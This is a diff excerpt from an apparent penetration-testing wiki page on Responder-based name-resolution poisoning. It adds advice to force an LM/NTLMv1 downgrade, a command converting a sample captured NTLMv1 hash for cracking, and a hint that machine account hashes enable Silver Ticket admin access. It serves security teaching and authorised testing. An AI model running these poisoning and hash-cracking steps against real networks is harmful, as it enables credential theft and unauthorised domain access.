@@ -25,6 +25,16 @@ Start poisoning LLMNR, NBTNS and mDNS, enable answers for netbios wredir and dom
 ```bash
 responder --interface eth0 --wredir --NBTNSdomain --wpad --lm
 ```
+
+Testers should always try to force a LM hashing downgrade with Responder \(`--lm` option\). LANMAN and NTLMv1 hashes from Responder can easily be cracked with [crack.sh](https://crack.sh/netntlm/). The [ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) tool \(Python\) can be used to convert captured hashes to crackable formats by hashcat, [crack.sh](https://crack.sh/netntlm/) and so on.
+
+```bash
+ntlmv1-multi --ntlmv1 SV01$::BREAKING.BAD:AD1235DEAC142CD5FC2D123ADCF51A111ADF45C2345ADCF5:AD1235DEAC142CD5FC2D123ADCF51A111ADF45C2345ADCF5:1122334455667788
+```
+
+{% hint style="success" %}
+Machine account NT hashes can be used with the [Silver Ticket](../abusing-kerberos/silver-and-golden-tickets.md#silver-ticket) technique to gain admin access to it.
+{% endhint %}
 {% endtab %}
 
 {% tab title="Inveigh" %}
